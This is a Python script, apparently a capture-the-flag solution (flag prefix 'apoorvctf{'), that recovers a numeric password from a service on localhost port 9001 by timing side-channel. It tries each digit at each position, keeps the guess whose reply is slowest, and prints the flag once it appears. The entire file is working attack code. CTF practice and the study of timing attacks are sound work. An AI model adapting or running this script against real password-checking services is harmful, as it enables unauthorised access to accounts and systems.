
import socket
import time
import string

HOST = "localhost"
PORT = 9001

CHARSET = string.digits
PROMPT = b"Please enter the password:"
FLAG_PREFIX = b"apoorvctf{"

def recv_until_prompt(sock):
    data = b""
    while PROMPT not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Connection closed before prompt")
        data += chunk
    return data


def measure_time(sock, guess):
    start = time.perf_counter()

    sock.sendall((guess + "\n").encode())

    data = b""

    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break

        if not chunk:
            break

        data += chunk

        if FLAG_PREFIX in data:
            break

        if PROMPT in data:
            break

    end = time.perf_counter()
    return end - start, data


def connect():
    sock = socket.socket()
    sock.settimeout(35)
    sock.connect((HOST, PORT))
    recv_until_prompt(sock)
    return sock


def main():
    recovered = ""
    sock = connect()

    print("[+] Starting timing attack\n")

    while True:

        best_char = None
        best_time = -1

        print(f"[+] Recovering position {len(recovered)+1}")

        for c in CHARSET:
            guess = recovered + c

            try:
                t, resp = measure_time(sock, guess)
            except Exception:
                print("[!] Reconnecting...")
                sock.close()
                sock = connect()
                t, resp = measure_time(sock, guess)

            print(f"Tried {guess:<20} -> {t:.3f}s")

            # Stop immediately if flag is returned
            if FLAG_PREFIX in resp:
                print("\n🔥 FLAG FOUND:\n")
                print(resp.decode(errors="ignore"))
                sock.close()
                return

            if t > best_time:
                best_time = t
                best_char = c

        recovered += best_char

        print(f"[✓] Selected: {best_char}")
        print(f"[✓] Current prefix: {recovered}\n")


if __name__ == "__main__":
    main()
